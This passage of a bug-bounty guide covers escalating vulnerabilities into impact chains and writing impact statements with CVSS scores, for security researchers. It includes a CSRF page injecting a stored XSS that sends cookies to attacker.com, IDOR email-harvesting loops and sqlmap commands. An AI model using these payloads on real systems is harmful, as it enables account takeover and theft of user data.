Individual vulnerabilities often have limited impact. **Chaining multiple issues together** creates critical-severity exploit paths that demonstrate devastating real-world consequences.
::

::tabs
  ::tabs-item{icon="i-lucide-link" label="Common Chains"}

  ```
  ┌──────────────────────────────────────────────────────────────────┐
  │              HIGH-VALUE VULNERABILITY CHAINS                     │
  │                                                                  │
  │  Chain 1: Self-XSS + CSRF = Stored XSS → ATO                   │
  │  ─────────────────────────────────────────                       │
  │  Self-XSS alone: Won't Fix / Informational                      │
  │  CSRF alone: Low / Medium                                        │
  │  Combined: High / Critical (Account Takeover)                    │
  │                                                                  │
  │  Chain 2: Open Redirect + OAuth = Token Theft → ATO             │
  │  ────────────────────────────────────────────                     │
  │  Open Redirect alone: Low / Informational                        │
  │  Combined: Critical (Any user account takeover)                  │
  │                                                                  │
  │  Chain 3: SSRF + Cloud Metadata = Credential Theft → RCE        │
  │  ──────────────────────────────────────────────────              │
  │  Basic SSRF alone: Medium                                        │
  │  Combined: Critical (Full infrastructure compromise)             │
  │                                                                  │
  │  Chain 4: Info Disclosure + IDOR = PII Breach                    │
  │  ─────────────────────────────────────────                       │
  │  Info disclosure alone: Low                                      │
  │  IDOR alone: Medium (without valid IDs)                          │
  │  Combined: Critical (leak IDs → access all user data)            │
  │                                                                  │
  │  Chain 5: CORS + Sensitive API = Silent Data Exfiltration        │
  │  ──────────────────────────────────────────────────              │
  │  CORS misconfiguration alone: Medium                             │
  │  Combined: High (steal data from any visiting user)              │
  │                                                                  │
  │  Chain 6: Path Traversal + Config Read = Credential Theft → ATO │
  │  ─────────────────────────────────────────────────────────       │
  │  Path traversal alone: Medium                                    │
  │  Combined: Critical (read .env → get DB creds → dump users)     │
  └──────────────────────────────────────────────────────────────────┘
  ```
  ::

  ::tabs-item{icon="i-lucide-code" label="Chain Implementation"}

  ```bash
  # ══════════════════════════════════════
  # Chain: Self-XSS + CSRF → Stored XSS → ATO
  # ══════════════════════════════════════

  # Step 1: Identify Self-XSS (only triggers on own profile)
  curl -s -X PUT "https://target.com/api/profile" \
    -H "Authorization: Bearer ATTACKER_TOKEN" \
    -d '{"bio":"<script>alert(1)</script>"}'
  # This XSS only fires when the attacker views their own profile

  # Step 2: Identify CSRF (no token required on profile update)
  curl -s -X PUT "https://target.com/api/profile" \
    -H "Cookie: session=VICTIM_SESSION" \
    -d '{"bio":"test"}' -w "\nHTTP: %{http_code}\n"
  # Profile updated without CSRF token → CSRF exists

  # Step 3: Chain → Force victim to inject XSS into their own profile
  cat << 'CSRF_PAGE' > chain_exploit.html
  <html>
  <body>
  <script>
  // CSRF that injects stored XSS into victim's profile
  fetch('https://target.com/api/profile', {
    method: 'PUT',
    credentials: 'include',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({
      bio: '<script>fetch("https://attacker.com/steal?c="+document.cookie)<\/script>'
    })
  });
  </script>
  </body>
  </html>
  CSRF_PAGE

  # Step 4: Any user who views the victim's profile gets XSS'd
  echo "Impact flow:
  1. Victim visits attacker's page → CSRF fires
  2. Victim's profile bio is replaced with XSS payload
  3. Anyone viewing victim's profile (including admins) triggers XSS
  4. XSS steals viewer's session cookie
  5. Attacker replays session → full account takeover
  
  This transforms two low/medium issues into a CRITICAL worm-like attack."

  # ══════════════════════════════════════
  # Chain: Info Disclosure + IDOR → Mass PII Breach
  # ══════════════════════════════════════

  # Step 1: Information disclosure reveals internal user IDs
  curl -s "https://target.com/api/posts?include=author" \
    -H "Authorization: Bearer TOKEN" | \
    jq '.[].author.internal_id' | sort -u > leaked_ids.txt
  echo "Leaked internal IDs: $(wc -l < leaked_ids.txt)"

  # Step 2: IDOR uses leaked IDs to access private user data
  while read id; do
    PROFILE=$(curl -s "https://target.com/api/users/${id}" \
      -H "Authorization: Bearer ATTACKER_TOKEN")
    EMAIL=$(echo "$PROFILE" | jq -r '.email // empty')
    [ -n "$EMAIL" ] && echo "ID $id: $EMAIL"
  done < leaked_ids.txt

  echo "
  Impact: Information disclosure in /api/posts leaks internal user IDs
  that are normally hidden. These IDs enable IDOR on /api/users/{id},
  exposing full PII for every user whose ID appears in any post.
  
  Neither issue alone would be Critical:
  - Info disclosure alone: Low (internal IDs aren't sensitive)  
  - IDOR alone: Medium (requires valid IDs to exploit)
  - Combined: Critical (systematic extraction of all user PII)"
  ```
  ::
::

### Context-Specific Impact Arguments

::collapsible

**Impact arguments that resonate with different types of programs:**

| Program Type | Impact Argument | Example Statement |
| --- | --- | --- |
| **Financial / Banking** | Monetary loss, fraud, regulatory fines | *"This allows unauthorized fund transfers. A single exploitation could result in $X theft. GLBA and PCI DSS violations apply."* |
| **Healthcare** | Patient safety, HIPAA violations | *"PHI of X patients is exposed. HIPAA breach notification is required. Potential fine: $1.5M per violation category."* |
| **E-Commerce** | Revenue loss, customer data breach | *"Attacker can purchase any product at $0. Customer PII including payment data for X users is accessible."* |
| **SaaS / B2B** | Multi-tenant compromise, enterprise data | *"Cross-tenant access exposes data of X enterprise customers. Their compliance certifications (SOC2, ISO27001) are invalidated."* |
| **Social Media** | Mass user impact, reputation damage | *"Worm-like XSS can propagate across X million users. Platform reputation damage is potentially unrecoverable."* |
| **Government** | National security, citizen data | *"Citizen PII including SSN for X residents is exposed. FISMA compliance violation. Mandatory breach disclosure."* |
| **Crypto / DeFi** | Irreversible financial loss | *"Smart contract vulnerability allows draining of $X TVL. Transactions are irreversible once executed."* |

::

---

## Impact Statement Templates

::badge
Report Writing
::

### Writing Compelling Impact Statements

::tabs
  ::tabs-item{icon="i-lucide-file-text" label="Structure"}

  ```
  IMPACT STATEMENT STRUCTURE:
  ═══════════════════════════
  
  1. WHAT can the attacker do? (capability)
     "An attacker can [specific action] without [normal requirement]"
  
  2. WHO is affected? (scope)
     "This affects [number] of [user type] across [geographic/org scope]"
  
  3. WHAT data/assets are at risk? (confidentiality)
     "Exposed data includes [data types] classified as [sensitivity level]"
  
  4. WHAT actions can be performed? (integrity)
     "Attacker can [modify/delete/create] [resource] on behalf of [any user]"
  
  5. WHAT services are disrupted? (availability)
     "Exploitation can [disrupt/disable] [service] affecting [user count]"
  
  6. HOW severe is it? (business impact)
     "Financial exposure: $[amount]. Regulatory: [frameworks]. Reputational: [assessment]"
  
  7. HOW easy is it? (exploitability)
     "Requires [no auth / user interaction / technical skill]. 
      Exploitation is [fully automated / requires manual steps]."
  ```
  ::

  ::tabs-item{icon="i-lucide-file-check" label="Examples by Severity"}

  **Critical Impact Statement (SSRF → Cloud Compromise):**
  ```
  IMPACT:
  An unauthenticated attacker can exploit the SSRF vulnerability in 
  /api/proxy?url= to access the AWS EC2 metadata service and retrieve 
  IAM credentials for the role "production-web-server". 
  
  These credentials grant:
  - Read/write access to 14 S3 buckets containing customer uploads, 
    database backups, and application logs
  - Read access to 3 RDS database instances containing production 
    user data for 2.3 million users
  - Access to 8 secrets in AWS Secrets Manager including database 
    passwords, API keys, and third-party service credentials
  - Ability to launch/terminate EC2 instances (service disruption)
  
  No authentication is required. The attack can be automated and 
  completed in under 60 seconds. This constitutes a full infrastructure 
  compromise with access to all customer data.
  
  CVSS: 10.0 (AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H)
  ```

  **High Impact Statement (IDOR → Mass Data Access):**
  ```
  IMPACT:
  An authenticated user can access any other user's complete profile 
  data by modifying the user ID in GET /api/users/{id}. The API 
  performs no authorization check beyond verifying a valid session.
  
  Affected data per user record:
  - Full name, email, phone number, physical address
  - Date of birth, government ID number
  - Payment method details (last 4 digits, card type, billing address)
  - Order history with item details and amounts
  - Account creation date and last login IP
  
  Total accessible records: 847,293 users
  Data classification: PII (Tier 1 - Critical)
  Extraction rate: ~50 records/second (full dump in ~4.7 hours)
  
  Regulatory exposure: GDPR (EU users: 312,000), CCPA (CA users: 89,000)
  
  CVSS: 7.5 (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)
  With environmental factors: 8.5+ (due to data sensitivity and volume)
  ```

  **Medium Impact Statement (Stored XSS):**
  ```
  IMPACT:
  An authenticated user can inject persistent JavaScript into the 
  "Company Name" field of their organization profile. This XSS 
  executes in the browser of any user who views the organization 
  directory page, including administrators.
  
  Demonstrated capabilities:
  - Session cookie theft (HttpOnly flag not set on session cookie)
  - CSRF token extraction from admin pages
  - Execution of admin API calls (user creation, role modification)
  - Exfiltration of data visible to the viewing user
  
  The organization directory is viewed by approximately 500 users 
  daily. Admin users access the directory weekly for user management.
  
  If an admin's session is stolen, the attacker gains:
  - Access to all 12,000 user accounts in the organization
  - Ability to modify user roles and permissions
  - Access to billing and payment configuration
  
  CVSS: 6.1 → 8.0+ when admin targeting and ATO chain are considered
  ```
  ::
::

---

## Impact Demonstration Pitfalls

::caution
These mistakes weaken your impact demonstration and can result in severity downgrades, rejected reports, or account penalties.
::

::accordion
  ::accordion-item
  ---
  icon: i-lucide-x-circle
  label: "Pitfall 1: alert(1) as Final Impact"
  ---

  **Problem:** Submitting XSS with `alert(1)` or `alert(document.domain)` as the only impact proof.

  **Why it hurts:** Triage teams see hundreds of `alert(1)` reports daily. Without demonstrated real-world impact, the finding may be downgraded to Informational or Low, or dismissed as a duplicate if a similar reflection was reported with better impact demonstration.

  ```bash
  # BAD: alert(1) only
  echo "PoC: https://target.com/search?q=<script>alert(1)</script>"
  # Impact: XSS exists → Severity: Low

  # GOOD: Full impact chain
  echo "PoC demonstrates:"
  echo "1. Cookie theft → session hijacking (HttpOnly absent)"
  echo "2. Same-origin API access → read /api/admin/users (if admin)"
  echo "3. CSRF token extraction → email change without victim interaction"
  echo "4. Password reset to attacker email → permanent account takeover"
  echo "Impact: Full ATO of any user → Severity: Critical"
  ```
  ::

  ::accordion-item
  ---
  icon: i-lucide-x-circle
  label: "Pitfall 2: Theoretical Impact Without Proof"
  ---

  **Problem:** Writing *"an attacker could potentially access all user data"* without actually demonstrating it.

  **Why it hurts:** Triage teams require **evidence**, not speculation. Claims without proof are routinely downgraded.

  ```bash
  # BAD: Theoretical claim
  echo "An attacker could potentially use this SSRF to access internal services
  and possibly steal cloud credentials."

  # GOOD: Demonstrated proof
  echo "SSRF was used to access http://169.254.169.254/latest/meta-data/
  Response confirmed AWS metadata accessible (screenshot attached).
  IAM role 'web-prod' credentials were retrieved (redacted in evidence).
  Using these credentials, the following was confirmed:
  - 14 S3 buckets accessible (command output attached)
  - 3 RDS instances visible (command output attached)
  - aws sts get-caller-identity confirms the role (output attached)"
  ```
  ::

  ::accordion-item
  ---
  icon: i-lucide-x-circle
  label: "Pitfall 3: Accessing More Data Than Necessary"
  ---

  **Problem:** Dumping entire databases, accessing real user PII, or downloading sensitive documents to prove impact.

  **Why it hurts:** This violates program policies, potentially breaks laws, and gets your account banned. You can demonstrate impact **without accessing real data**.

  ```bash
  # BAD: Dump all user data
  sqlmap -u "URL" --dump-all  # NEVER do this

  # GOOD: Prove access scope without touching real data
  # Show table structure and row count
  sqlmap -u "URL" --batch --count -D target_db -T users
  # Output: "Table users has 2,347,891 entries"

  # Show column names (not data)
  sqlmap -u "URL" --batch -D target_db -T users --columns

  # Extract only YOUR OWN test account as proof
  sqlmap -u "URL" --batch -D target_db -T users \
    --where "email='your_test_account@test.com'" --dump

  # For IDOR — sample 3-5 records, redact everything
  curl -s "https://target.com/api/users/2" -H "Authorization: Bearer ATTACKER" | \
    jq '{id, email: "r***@***.com", has_phone: (.phone != null), has_ssn: (.ssn != null)}'
  ```
  ::

  ::accordion-item
  ---
  icon: i-lucide-x-circle
  label: "Pitfall 4: Ignoring Mitigating Controls"
  ---

  **Problem:** Claiming critical impact without acknowledging security controls that reduce real-world exploitability.

  **Why it hurts:** If the triage team finds controls you didn't mention, your credibility suffers and the finding is downgraded.

  ```bash
  # GOOD: Acknowledge and address mitigating controls

  # Check for CSP (affects XSS impact)
  curl -s -I "https://target.com" | grep -i "content-security-policy"
  # If CSP exists: "CSP is present but can be bypassed via [technique]"
  # If CSP blocks: "CSP reduces XSS impact to [limited scope]"

  # Check for HttpOnly (affects cookie theft)
  curl -s -I "https://target.com" | grep -i "set-cookie" | grep -i "httponly"
  # If HttpOnly: "Cookie theft not possible, but same-origin API access 
  #               and CSRF token extraction remain viable"

  # Check for rate limiting (affects IDOR mass extraction)
  for i in $(seq 1 100); do
    STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
      "https://target.com/api/users/$i" -H "Authorization: Bearer TOKEN")
    [ "$STATUS" = "429" ] && echo "Rate limited at request $i" && break
  done
  # If rate limited: "Rate limiting slows extraction but does not prevent it.
  #                   At 10 req/sec, full extraction takes X hours instead of Y minutes."

  # Check for WAF (affects payload delivery)
  curl -s -I "https://target.com" | grep -iE "cloudflare|akamai|aws"
  # If WAF: "WAF blocks standard payloads but the following bypass was successful: [payload]"

  # Check for 2FA (affects ATO impact)
  curl -s "https://target.com/api/me" -H "Authorization: Bearer TOKEN" | jq '.mfa_enabled'
  # If 2FA: "2FA is available but not enforced. X% of users have it disabled.
  #          Additionally, the XSS executes within an already-authenticated session,
  #          bypassing 2FA entirely."
  ```
  ::

  ::accordion-item
  ---
  icon: i-lucide-x-circle
  label: "Pitfall 5: No Comparison to Normal Behavior"
  ---

  **Problem:** Showing the exploit result without showing what the **normal** (non-exploited) behavior looks like. The triage team can't tell what's anomalous.

  ```bash
  # BAD: Only showing exploit result
  curl -s "https://target.com/api/users/VICTIM" -H "Auth: ATTACKER_TOKEN" | jq '.'
  # Triage team thinks: "Is this supposed to return data?"

  # GOOD: Show normal vs exploited side by side
  echo "=== EXPECTED BEHAVIOR (accessing own data) ==="
  curl -s "https://target.com/api/users/ATTACKER_ID" \
    -H "Authorization: Bearer ATTACKER_TOKEN" | jq '{id, email, role}'

  echo ""
  echo "=== EXPLOITED BEHAVIOR (accessing victim's data) ==="
  curl -s "https://target.com/api/users/VICTIM_ID" \
    -H "Authorization: Bearer ATTACKER_TOKEN" | jq '{id, email, role}'

  echo ""
  echo "=== EXPECTED: 403 Forbidden ==="
  echo "=== ACTUAL: 200 OK with full victim profile data ==="
  echo "The API does not verify that the authenticated user matches the requested user ID."
  ```
  ::
::

---

## Impact Quantification Reference

::badge
CVSS Scoring Guide
::

### CVSS Impact Metrics by Demonstration

::collapsible

**How Demonstrated Impact Maps to CVSS v3.1 Scores:**

| Demonstrated Impact | Confidentiality | Integrity | Availability | Example CVSS |
| --- | --- | --- | --- | --- |
| Read own data only | None | None | None | N/A (not a vuln) |
| Read limited other user data | Low | None | None | 4.3 |
| Read all data of one user | High | None | None | 6.5 |
| Read all data of all users | High | None | None | 7.5 |
| Modify own data in unintended way | None | Low | None | 4.3 |
| Modify other user's data | None | High | None | 6.5 |
| Read + modify all user data | High | High | None | 8.1 |
| Account takeover (single user) | High | High | Low | 8.8 |
| Account takeover (any user) | High | High | High | 9.8 |
| RCE as application user | High | High | High | 9.8 |
| RCE as root/SYSTEM | High | High | High | 10.0 |
| Infrastructure/cloud compromise | High | High | High | 10.0 |

**Scope Changed (S:C) Elevators:**

| Scenario | Base Score | With S:C |
| --- | --- | --- |
| XSS → access other origin | 6.1 | 7.2 |
| SSRF → internal network | 6.5 | 9.1 |
| SQLi → OS command | 7.5 | 10.0 |
| Container escape | 7.8 | 10.0 |
| Tenant isolation bypass | 7.5 | 9.9 |

::

```bash
# Quick CVSS calculator for your findings
calculate_cvss() {
  local AV=$1  # N=Network A=Adjacent L=Local P=Physical
  local AC=$2  # L=Low H=High
  local PR=$3  # N=None L=Low H=High
  local UI=$4  # N=None R=Required
  local S=$5   # U=Unchanged C=Changed
  local C=$6   # N=None L=Low H=High
  local I=$7   # N=None L=Low H=High
  local A=$8   # N=None L=Low H=High
  
  VECTOR="CVSS:3.1/AV:${AV}/AC:${AC}/PR:${PR}/UI:${UI}/S:${S}/C:${C}/I:${I}/A:${A}"
  echo "Vector: $VECTOR"
  echo "Calculate at: https://www.first.org/cvss/calculator/3.1#${VECTOR}"
}

# Examples:
echo "=== Unauthenticated RCE ==="
calculate_cvss N L N N C H H H
# Score: 10.0

echo "=== Authenticated IDOR (read only) ==="
calculate_cvss N L L N U H N N
# Score: 6.5

echo "=== XSS → Account Takeover ==="
calculate_cvss N L N R C H H N
# Score: 9.3

echo "=== SSRF → Cloud Metadata ==="
calculate_cvss N L N N C H H H
# Score: 10.0

echo "=== Stored XSS (self-only, no chain) ==="
calculate_cvss N L L R U L L N
# Score: 4.6
```

---

## Best Practices

::card-group
  ::card
  ---
  title: Always Escalate Before Reporting
  icon: i-lucide-trending-up
  ---
  Never submit the initial trigger alone. Spend time finding the **maximum realistic impact** — session hijacking, data exfiltration, account takeover, privilege escalation. The extra hour of escalation work can multiply your payout by 10x.
  ::

  ::card
  ---
  title: Show Side-by-Side Comparison
  icon: i-lucide-columns-2
  ---
  Always demonstrate **expected behavior vs actual behavior**. Show what the normal response looks like, then show the exploited response. The contrast makes the vulnerability undeniable.
  ::

  ::card
  ---
  title: Use Multiple Evidence Formats
  icon: i-lucide-layers
  ---
  Combine **HTTP request/response logs, screenshots, video recordings, and reproducible scripts**. Different triage team members prefer different formats. Cover all bases.
  ::

  ::card
  ---
  title: Redact But Don't Hide
  icon: i-lucide-eye-off
  ---
  Redact sensitive data in your evidence (emails, SSNs, card numbers) but **keep enough visible** to prove the data type is real. Show `j***@g***.com` not `[REDACTED]`.
  ::

  ::card
  ---
  title: Quantify Everything
  icon: i-lucide-hash
  ---
  Replace words with numbers. Not *"many users affected"* but *"2,347,891 users across 1,200 organizations"*. Not *"sensitive data exposed"* but *"email, phone, SSN, and payment data for every user"*.
  ::

  ::card
  ---
  title: Acknowledge Mitigating Controls
  icon: i-lucide-shield-check
  ---
  Proactively address security controls (CSP, WAF, rate limiting, 2FA). Either show how they were bypassed or honestly state their mitigating effect. This builds credibility and prevents surprise downgrades.
  ::
::

::caution
Impact Demonstration must be conducted **ethically and within program boundaries**. Never access real user data beyond what's minimally necessary. Use your own test accounts for write/delete demonstrations. Redact all sensitive information in reports. The goal is to prove impact potential, not to cause actual harm.
::